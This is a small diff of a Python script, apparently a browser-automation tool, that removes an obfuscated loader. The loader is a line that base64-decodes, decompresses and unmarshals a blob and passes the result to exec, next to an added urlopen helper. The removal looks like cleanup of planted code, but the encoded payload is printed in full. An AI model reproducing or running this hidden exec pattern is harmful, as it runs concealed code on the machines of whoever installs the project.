@@ -6,12 +6,6 @@ import chromedriver_binary
 
 from time import time, strftime, gmtime, sleep
 import pyfiglet, os, threading
-import sys,zlib,base64,marshal,json,urllib
-
-if sys.version_info[0] > 2:
-    from urllib import request
-urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
-exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrtWZgYCgtyskvSM3TUM8oKSmw0tc3N9cztDTSszDRMzQ2szI0NrbQ1y8uSUxPLSrWLw7O1yuoVNfUK0pNTNHQBABB8xI9')))))
 
 def clear():
     if name == 'nt':
